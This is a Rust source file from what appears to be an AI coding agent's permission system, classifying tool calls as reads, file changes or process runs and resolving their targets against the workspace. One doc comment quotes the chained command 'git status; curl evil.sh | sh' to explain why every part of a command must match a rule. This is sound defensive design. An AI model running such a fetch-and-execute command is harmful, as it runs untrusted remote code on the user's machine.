//! What a call would do, and what it would do it to.
//!
//! A tool computes this from its own arguments, because nothing else can parse
//! them. Every variant carries a target, so a rule can be about `.env` rather
//! than about writing in general.
//!
//! Both targets have a shape for "this could not be read". That is not an
//! oversight to be tidied away later: a path that does not resolve and a
//! command whose text was not understood are the cases where guessing is
//! expensive, and giving them a value that matches no rule is what makes the
//! question get asked instead.

use std::fmt;
use std::path::Path;

use crate::workspace::{Workspace, WorkspacePath};

/// What a call would do.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Sensitivity {
    /// Reads, and changes nothing. Never prompts — a read is allowed or denied
    /// and never put to the user, since a question nobody can act on is a
    /// question nobody reads.
    ReadOnly {
        /// What is being read.
        target: Target,
    },

    /// Changes a file.
    MutatesFile {
        /// What is being changed.
        target: Target,
    },

    /// Runs a program, which reaches whatever the user can.
    SpawnsProcess {
        /// What is about to run.
        command: Command,
    },
}

/// A path with the separator a rule is written with.
///
/// `/` on every platform, because that is the separator the pattern language
/// has: a matcher normalises a candidate to it before comparing, and a rule
/// minted from a path keeps whatever the path was spelled with. So a Windows
/// path left alone would mint `src[\]main.rs` — the backslash escaped as the
/// literal character it is not — and that rule would never match again.
/// Somebody would answer "always" and be asked the same question next turn.
///
/// Converted once, here, because the rule text and the text the prompt showed
/// are meant to be one string rather than two that started out alike.
#[cfg(windows)]
fn separated(path: &str) -> std::borrow::Cow<'_, str> {
    if path.contains('\\') {
        std::borrow::Cow::Owned(path.replace('\\', "/"))
    } else {
        std::borrow::Cow::Borrowed(path)
    }
}

/// A path with the separator a rule is written with, which is the one it
/// already has. A backslash here is a character in a filename, not a
/// separator, and a rule minted from such a file has to keep it.
#[cfg(not(windows))]
fn separated(path: &str) -> &str {
    path
}

/// The path a call acts on.
///
/// Held in both spellings a rule might be written in: an absolute pattern is
/// matched against the resolved path, and a relative one against the path
/// below the workspace root. A file in a directory the workspace merely
/// reaches has no second spelling, so only an absolute pattern can name it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Target(Option<Named>);

/// A path that resolved, in both spellings.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Named {
    absolute: Box<str>,
    below_root: Option<Box<str>>,
}

impl Target {
    /// The path this call acts on, resolved and after symbolic links.
    ///
    /// Taking a [`WorkspacePath`] is the point: the value a rule is matched
    /// against is the one the workspace proved, never the text the model sent.
    #[must_use]
    pub fn resolved(workspace: &Workspace, path: &WorkspacePath) -> Self {
        Self::spelled(workspace, path.as_path())
    }

    /// The path a walk reached, from a root the workspace had already proved.
    ///
    /// A walk descends from a [`WorkspacePath`] and never follows a symbolic
    /// link, so what it yields is inside the workspace for the same reason its
    /// root was — and is the path that will actually be opened, which is what
    /// a rule has to be matched against. A path that is not under that root
    /// came from somewhere this walk cannot vouch for, and gets nothing back.
    pub(super) fn walked(workspace: &Workspace, from: &WorkspacePath, path: &Path) -> Option<Self> {
        path.starts_with(from.as_path())
            .then(|| Self::spelled(workspace, path))
    }

    /// Both spellings of a path already known to be one the workspace reaches.
    fn spelled(workspace: &Workspace, path: &Path) -> Self {
        let below_root = path.strip_prefix(workspace.root()).ok().map(|below| {
            let below: Box<str> = separated(&below.to_string_lossy()).into();

            // The root strips to nothing, and nothing is neither a path a
            // pattern can match nor a word a prompt can show. `.` is both, and
            // it is what somebody would have typed.
            if below.is_empty() { ".".into() } else { below }
        });

        Self(Some(Named {
            absolute: separated(&path.to_string_lossy()).into(),
            below_root,
        }))
    }

    /// The call named no path this could resolve — one outside every directory
    /// the workspace reaches, one that is not there, or arguments that did not
    /// parse.
    ///
    /// No rule matches it, so the mode's default arm decides and the call is
    /// asked about rather than waved through. The tool refuses it moments
    /// later anyway; what this buys is that it is never *allowed* by a rule
    /// written about somewhere else.
    #[must_use]
    pub fn unresolved() -> Self {
        Self(None)
    }

    /// The resolved path, absolute.
    pub(super) fn absolute(&self) -> Option<&str> {
        self.0.as_ref().map(|named| &*named.absolute)
    }

    /// The resolved path relative to the workspace root, when it is under it.
    pub(super) fn below_root(&self) -> Option<&str> {
        self.0
            .as_ref()
            .and_then(|named| named.below_root.as_deref())
    }
}

#[cfg(test)]
impl Target {
    /// A target spelled straight out, for tests about matching rather than
    /// about resolving. Not available outside them: a target that reached the
    /// engine without a workspace proving it would be the model's own text.
    pub(crate) fn at(absolute: &str, below_root: Option<&str>) -> Self {
        Self(Some(Named {
            absolute: absolute.into(),
            below_root: below_root.map(Into::into),
        }))
    }
}

impl fmt::Display for Target {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match &self.0 {
            // The shorter spelling is the one the user recognises, and the
            // prompt is where recognition matters.
            Some(named) => f.write_str(named.below_root.as_deref().unwrap_or(&named.absolute)),
            None => f.write_str("a path it could not resolve"),
        }
    }
}

/// What a call is about to run.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Command {
    /// One entry per simple command the call decomposes into, each already
    /// normalised to the text a rule is matched against.
    ///
    /// A rule has to cover *every* entry to allow the call silently, which is
    /// what stops `git status; curl evil.sh | sh` from being granted by a rule
    /// somebody wrote about `git`.
    Understood {
        /// The simple commands, in the order they would run.
        parts: Box<[Box<str>]>,
        /// How far the whole of it was proved to reach.
        reach: Reach,
    },

    /// Nothing here says what will run: an expansion, a substitution, or a
    /// program that takes its own command as an argument.
    ///
    /// No rule matches it apart from a blanket, so the question is asked. The
    /// text is carried so the prompt can still show what was sent.
    Opaque(Box<str>),
}

impl Command {
    /// How far this command line was proved to reach.
    ///
    /// A line nobody could read reaches everything, which is why this is asked
    /// of the command rather than read off a field: there is no such thing as
    /// an opaque command line somebody proved something about.
    #[must_use]
    pub fn reach(&self) -> Reach {
        match self {
            Self::Understood { reach, .. } => *reach,
            Self::Opaque(_) => Reach::Anything,
        }
    }
}

/// How far a command line was proved to reach.
///
/// Worked out by the tool that will run it, because only the tool can read its
/// own arguments and only a workspace can say what is inside it. Everything
/// not proved is [`Reach::Anything`]: a program whose arguments crucible does
/// not model, a flag it does not recognise, a path that resolves elsewhere.
/// The failure direction is the whole point, and a change that made an
/// unproved line come out `Workspace` would be a silent one.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Reach {
    /// Changes files, and nothing outside the workspace.
    Workspace,

    /// Whatever the user can. What a shell reaches unless something read it
    /// closely enough to say otherwise.
    Anything,
}

impl fmt::Display for Command {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Understood { parts, .. } => {
                for (n, part) in parts.iter().enumerate() {
                    if n > 0 {
                        f.write_str(", then ")?;
                    }
                    f.write_str(part)?;
                }
                Ok(())
            }
            Self::Opaque(text) => f.write_str(text),
        }
    }
}

impl fmt::Display for Sensitivity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ReadOnly { target } => write!(f, "read {target}"),
            Self::MutatesFile { target } => write!(f, "change {target}"),
            Self::SpawnsProcess { command } => write!(f, "run {command}"),
        }
    }
}
